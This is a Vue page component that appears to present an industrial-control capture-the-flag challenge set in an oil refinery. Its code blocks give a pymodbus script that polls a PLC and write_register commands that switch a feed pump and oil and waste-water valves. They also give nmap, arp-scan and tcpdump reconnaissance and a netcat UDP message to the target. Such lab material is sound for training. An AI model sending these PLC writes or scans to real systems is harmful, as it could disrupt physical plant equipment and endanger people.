<template>
  <div>
    <h1>{{ $t('welcome') }}</h1>
    <p>{{ $t('exploreChallenges') }}</p>
    <img 
      src="@/assets/challenge_viewer.png" 
      alt="viewer" 
      style="width: 800px; height: 600px; max-width: 100%; object-fit: cover; display: block; margin: 0 auto;" 
    />
    <h2>{{ $t('instructions') }}</h2>
    <ol>
      <li>
        <strong>{{ $t('criticalAlerts') }}</strong>
        <p>{{ $t('requiredData') }}</p>
      </li>
      <li>
        <strong>{{ $t('vulnerabilityWindow') }}</strong>
        <p>{{ $t('refineryCodeAccess') }}</p>
      </li>
      <li>
        <strong>{{ $t('refineryCodeAccess') }}</strong>
        <p>{{ $t('requiredData') }}</p>
      </li>
      <li>
        <strong>{{ $t('requiredData') }}</strong>
        <p>{{ $t('behavior') }}</p>
        <ul>
          <li>{{ $t('behavior') }}</li>
          <li>{{ $t('unexpectedMessage') }}</li>
        </ul>
      </li>
    </ol>

    <h3>{{ $t('scanningScript') }}</h3>
    <pre>
      <code>
#!/usr/bin/env python3

import sys
import time
from pymodbus.client import ModbusTcpClient as ModbusClient
from pymodbus.exceptions import ConnectionException

ip = sys.argv[1]
client = ModbusClient(ip, port=5020)
client.connect()
while True:
    rr = client.read_holding_registers(1, 16)
    print(rr.registers)
    time.sleep(1)
      </code>
    </pre>

    <h3>{{ $t('writeCommands') }}</h3>
    <pre>
      <code>
client.write_register(1, 1) # PLC_FEED_PUMP
client.write_register(3, 1) # PLC_OUTLET_VALVE
client.write_register(4, 1) # PLC_SEP_OIL_VALVE
client.write_register(8, 0) # PLC_WASTE_WATER_VALVE
      </code>
    </pre>

    <h3>{{ $t('objective') }}</h3>
    <pre>
      <code>
$ sudo arp-scan --ignoredups --localnet
$ sudo nmap -A -Pn -T3 &lt;ip_vmalvo&gt;
<span>http://&lt;ip_vmalvo&gt;/</span>
      </code>
    </pre>

    <h3>{{ $t('abnormalTraffic') }}</h3>
    <pre>
      <code>
$ sudo nmap -Pn -T3 --version-intensity 9 –p- &lt;ip_vmalvo&gt; -vv
$ sudo tcpdump -i eth0 -A -n host &lt;ip_vmalvo&gt; and not port 80
$ sudo tcpdump -i eth0 -A -n host &lt;ip_vmalvo&gt; and udp
$ sudo tcpdump -i eth0 -A -n host &lt;ip_vmalvo&gt; and not arp
      </code>
    </pre>

    <h3>{{ $t('pythonScripts') }}</h3>
    <pre>
      <code>
$ python2.7 -c "print ‘sua mensagem aqui’ " | nc -u &lt;ip_vmalvo&gt; 5021 -q1
      </code>
    </pre>
  </div>
</template>


<script lang="ts" setup>
</script>

<style scoped>
/* Adicione estilos específicos para a página inicial aqui */
h2, h3 {
  margin-top: 20px;
  color: #003366;
}
code {
  background-color: #f4f4f4;
  padding: 10px;
  display: block;
  border-radius: 5px;
  margin-top: 10px;
}
</style>
